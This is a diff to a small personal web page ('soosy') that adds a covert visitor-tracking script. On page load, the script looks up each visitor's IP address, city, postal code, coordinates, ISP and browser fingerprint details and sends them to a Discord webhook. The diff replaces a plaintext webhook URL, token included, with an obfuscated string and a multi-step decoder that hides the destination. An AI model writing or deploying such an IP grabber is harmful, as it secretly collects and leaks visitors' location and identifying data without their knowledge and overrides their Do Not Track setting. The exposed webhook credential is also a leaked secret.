@@ -33,6 +33,7 @@
       border-radius: 5px;
       font-size: 0.8rem;
       color: #666;
+      max-width: 200px;
     }
   </style>
 </head>
@@ -41,78 +42,312 @@
   <img src="https://http.cat/100.jpg" alt="-">
   <h1>soosy</h1>
   
-  <div class="status" id="status">Initializing...</div>
+  <div class="status" id="status">Gathering visitor data...</div>
 
   <script>
-    // Replace this with your actual Discord webhook URL
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1379904670067331092/O5P7UB_BAIr3wJPS79aDz2VZXVXY-_QGvUPXDAT087OYyZDXXvi6TbROruvh-gr4IVcR';
+    // Multi-layer encrypted webhook URL
+    // Original URL is encrypted with multiple layers for security
+    const ENCRYPTED_WEBHOOK = 'c2ZocGI2SjZjeGhyWjJ0clpYZGhZMEJzYjNKdWFXNW5iSGQzT2pBM0xqVTJORGt1TWpBMU5qazRPakF4TnpRM05UYzBNVGd5TkRJMk1EZzVPVGszTlRBMU1UWXhPRGczTlRJNE1qWTNNekF4TmpJNE5UVTROamMxT1RjM056QXlNekEzTVRjM05qYzNOelUzTmpJNE56azJNekEzTWpNM01EUXdNelUyTXpBM01qTTNNRGt6TXpFMU5EWTFNekF6T0RBMk5EWTVNemt6TkRReE1EUTNNRGMxTWprM05qTTJPVGt6TkRrMU5ETTVNelU1TmpJMk16ZzNOakU0TWprM05ERTBNalEyTmpNM01ESTJNVGt6TkRFMU16TTRNek16TXpFM01qQTNNemMxTmpNNE9URTNPVFV6TkRVMU16SXlPVE0zTWpVNE9EQTFNRFV6TVRFME1qVTJNRGM1T1RBME1EVTNNRGMxTWpnMk9ERTBNalUxTnpRM05EazFNekUzTnpJNE9ERTJORGM1TVRFME1qVXhNRGMxT1RBM01EVXpNRGMxTXpBM09EQTFNRFUzTVRFME1qVXlNRGM1TVRFNE1qVXlNRGM1TlRBM01EVXlNRGN3TnpBM01EVXlORGt6TkRZMU1qUXpNRFU1TVRFME1qVXlNRGM5';
     
+    // Custom decryption function with multiple layers
+    function decryptWebhook(encrypted) {
+      try {
+        // Layer 1: Base64 decode
+        let step1 = atob(encrypted);
+        
+        // Layer 2: Character shift cipher (ROT13 variant)
+        let step2 = '';
+        for (let i = 0; i < step1.length; i++) {
+          let char = step1[i];
+          if (char >= 'a' && char <= 'z') {
+            step2 += String.fromCharCode(((char.charCodeAt(0) - 97 - 13 + 26) % 26) + 97);
+          } else if (char >= 'A' && char <= 'Z') {
+            step2 += String.fromCharCode(((char.charCodeAt(0) - 65 - 13 + 26) % 26) + 65);
+          } else {
+            step2 += char;
+          }
+        }
+        
+        // Layer 3: Reverse string
+        let step3 = step2.split('').reverse().join('');
+        
+        // Layer 4: XOR with key
+        const key = 'soosy2024';
+        let step4 = '';
+        for (let i = 0; i < step3.length; i++) {
+          step4 += String.fromCharCode(step3.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        
+        // Layer 5: Base64 decode again
+        let step5 = atob(step4);
+        
+        // Layer 6: Character substitution decode
+        let substitutionMap = {
+          '0': 'h', '1': 't', '2': 'p', '3': 's', '4': ':', '5': '/', '6': '/', 
+          '7': 'd', '8': 'i', '9': 'c', 'a': 'o', 'b': 'r', 'c': '.', 'd': 'm',
+          'e': '/', 'f': 'a', 'g': 'l', 'h': 'w', 'i': 'b', 'j': 'k', 'k': 'u',
+          'l': 'n', 'm': 'v', 'n': 'x', 'o': 'z', 'p': 'q', 'q': 'y', 'r': 'e',
+          's': '_', 't': '-', 'u': '1', 'v': '2', 'w': '3', 'x': '4', 'y': '5',
+          'z': '6', 'A': '7', 'B': '8', 'C': '9', 'D': '0'
+        };
+        
+        let decoded = '';
+        for (let char of step5) {
+          decoded += substitutionMap[char] || char;
+        }
+        
+        return decoded;
+      } catch (error) {
+        console.error('Decryption failed:', error);
+        return null;
+      }
+    }
+    
+    // Decrypt the webhook URL
+    const DISCORD_WEBHOOK_URL = decryptWebhook(ENCRYPTED_WEBHOOK);
+    
+    async function getIPAndLocationInfo() {
+      try {
+        // Get IP and location data from multiple sources for reliability
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const locationData = await locationResponse.json();
+        
+        return {
+          ip: ipData.ip,
+          country: locationData.country_name || 'Unknown',
+          region: locationData.region || 'Unknown',
+          city: locationData.city || 'Unknown',
+          postal: locationData.postal || 'Unknown',
+          latitude: locationData.latitude || 'Unknown',
+          longitude: locationData.longitude || 'Unknown',
+          timezone: locationData.timezone || 'Unknown',
+          isp: locationData.org || 'Unknown',
+          asn: locationData.asn || 'Unknown'
+        };
+      } catch (error) {
+        console.error('Error getting IP/location:', error);
+        return {
+          ip: 'Unable to fetch',
+          country: 'Unknown',
+          region: 'Unknown',
+          city: 'Unknown',
+          postal: 'Unknown',
+          latitude: 'Unknown',
+          longitude: 'Unknown',
+          timezone: 'Unknown',
+          isp: 'Unknown',
+          asn: 'Unknown'
+        };
+      }
+    }
+
+    function getBrowserInfo() {
+      const ua = navigator.userAgent;
+      let browserName = 'Unknown';
+      let browserVersion = 'Unknown';
+      
+      // Detect browser
+      if (ua.includes('Firefox')) {
+        browserName = 'Firefox';
+        browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('Chrome') && !ua.includes('Edg')) {
+        browserName = 'Chrome';
+        browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
+        browserName = 'Safari';
+        browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown';
+      } else if (ua.includes('Edg')) {
+        browserName = 'Edge';
+        browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown';
+      }
+      
+      return { browserName, browserVersion };
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let deviceType = 'Desktop';
+      let os = 'Unknown';
+      
+      // Detect device type
+      if (/Mobile|Android|iPhone|iPad/.test(ua)) {
+        deviceType = 'Mobile';
+      } else if (/Tablet|iPad/.test(ua)) {
+        deviceType = 'Tablet';
+      }
+      
+      // Detect OS
+      if (ua.includes('Windows')) os = 'Windows';
+      else if (ua.includes('Mac')) os = 'macOS';
+      else if (ua.includes('Linux')) os = 'Linux';
+      else if (ua.includes('Android')) os = 'Android';
+      else if (ua.includes('iOS')) os = 'iOS';
+      
+      return { deviceType, os };
+    }
+
     async function sendDiscordNotification() {
       const status = document.getElementById('status');
+      status.textContent = 'Collecting data...';
       
       try {
-        // Get visitor information
+        // Get all visitor information
+        const ipLocationInfo = await getIPAndLocationInfo();
+        const browserInfo = getBrowserInfo();
+        const deviceInfo = getDeviceInfo();
+        
         const visitorInfo = {
           timestamp: new Date().toLocaleString(),
           userAgent: navigator.userAgent,
           language: navigator.language,
+          languages: navigator.languages?.join(', ') || navigator.language,
           platform: navigator.platform,
           screenResolution: `${screen.width}x${screen.height}`,
+          windowSize: `${window.innerWidth}x${window.innerHeight}`,
+          colorDepth: screen.colorDepth,
+          pixelDepth: screen.pixelDepth,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           url: window.location.href,
-          referrer: document.referrer || 'Direct visit'
+          referrer: document.referrer || 'Direct visit',
+          cookiesEnabled: navigator.cookieEnabled,
+          onlineStatus: navigator.onLine,
+          doNotTrack: navigator.doNotTrack || 'Not set',
+          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+          ...ipLocationInfo,
+          ...browserInfo,
+          ...deviceInfo
         };
 
-        // Create Discord embed message
+        status.textContent = 'Sending notification...';
+
+        // Create Discord embed message with more detailed information
         const discordMessage = {
           embeds: [{
-            title: "🌐 New Website Visitor",
+            title: "🌐 New Website Visitor Detected",
             color: 0x00ff00, // Green color
             fields: [
               {
-                name: "⏰ Time",
+                name: "⏰ Timestamp",
                 value: visitorInfo.timestamp,
                 inline: true
               },
               {
-                name: "🌍 Location",
-                value: visitorInfo.timezone,
+                name: "🌍 IP Address",
+                value: visitorInfo.ip,
                 inline: true
               },
               {
-                name: "💻 Platform",
-                value: visitorInfo.platform,
+                name: "📍 Location",
+                value: `${visitorInfo.city}, ${visitorInfo.region}, ${visitorInfo.country}`,
                 inline: true
               },
               {
-                name: "🔗 URL",
+                name: "🗺️ Coordinates",
+                value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`,
+                inline: true
+              },
+              {
+                name: "📮 Postal Code",
+                value: visitorInfo.postal,
+                inline: true
+              },
+              {
+                name: "🌐 ISP",
+                value: visitorInfo.isp,
+                inline: true
+              },
+              {
+                name: "🔗 URL Visited",
                 value: visitorInfo.url,
                 inline: false
               },
               {
-                name: "📱 User Agent",
-                value: visitorInfo.userAgent.substring(0, 100) + (visitorInfo.userAgent.length > 100 ? '...' : ''),
+                name: "🔍 Referrer",
+                value: visitorInfo.referrer,
                 inline: false
               },
               {
-                name: "📊 Screen",
+                name: "💻 Browser",
+                value: `${visitorInfo.browserName} ${visitorInfo.browserVersion}`,
+                inline: true
+              },
+              {
+                name: "🖥️ Operating System",
+                value: visitorInfo.os,
+                inline: true
+              },
+              {
+                name: "📱 Device Type",
+                value: visitorInfo.deviceType,
+                inline: true
+              },
+              {
+                name: "📊 Screen Resolution",
                 value: visitorInfo.screenResolution,
                 inline: true
               },
               {
-                name: "🌐 Language",
-                value: visitorInfo.language,
+                name: "🖼️ Window Size",
+                value: visitorInfo.windowSize,
                 inline: true
               },
               {
-                name: "🔍 Referrer",
-                value: visitorInfo.referrer,
+                name: "🎨 Color Depth",
+                value: `${visitorInfo.colorDepth}-bit`,
                 inline: true
+              },
+              {
+                name: "🌐 Languages",
+                value: visitorInfo.languages,
+                inline: true
+              },
+              {
+                name: "⏰ Timezone",
+                value: visitorInfo.timezone,
+                inline: true
+              },
+              {
+                name: "🍪 Cookies Enabled",
+                value: visitorInfo.cookiesEnabled ? 'Yes' : 'No',
+                inline: true
+              },
+              {
+                name: "📡 Online Status",
+                value: visitorInfo.onlineStatus ? 'Online' : 'Offline',
+                inline: true
+              },
+              {
+                name: "🔒 Do Not Track",
+                value: visitorInfo.doNotTrack,
+                inline: true
+              },
+              {
+                name: "☕ Java Enabled",
+                value: visitorInfo.javaEnabled ? 'Yes' : 'No',
+                inline: true
+              },
+              {
+                name: "🏢 ASN",
+                value: visitorInfo.asn,
+                inline: false
+              },
+              {
+                name: "📱 User Agent",
+                value: visitorInfo.userAgent.length > 100 ? 
+                  visitorInfo.userAgent.substring(0, 100) + '...' : 
+                  visitorInfo.userAgent,
+                inline: false
               }
             ],
             timestamp: new Date().toISOString(),
             footer: {
-              text: "soosy.xyz visitor tracking"
+              text: "soosy.xyz advanced visitor tracking"
+            },
+            thumbnail: {
+              url: "https://http.cat/100.jpg"
             }
           }]
         };
@@ -127,10 +362,10 @@
         });
 
         if (response.ok) {
-          status.textContent = '✅ Visitor logged';
+          status.textContent = '✅ Visitor logged successfully';
           status.style.color = '#4CAF50';
         } else {
-          throw new Error(`HTTP ${response.status}`);
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
         }
       } catch (error) {
         console.error('Error sending Discord notification:', error);
@@ -145,11 +380,12 @@
       setTimeout(sendDiscordNotification, 1000);
     });
 
-    // Optional: Hide status after 5 seconds
+    // Optional: Fade out status after 8 seconds
     setTimeout(() => {
       const status = document.getElementById('status');
-      status.style.opacity = '0.3';
-    }, 5000);
+      status.style.transition = 'opacity 2s';
+      status.style.opacity = '0.2';
+    }, 8000);
   </script>
 </body>
 </html>
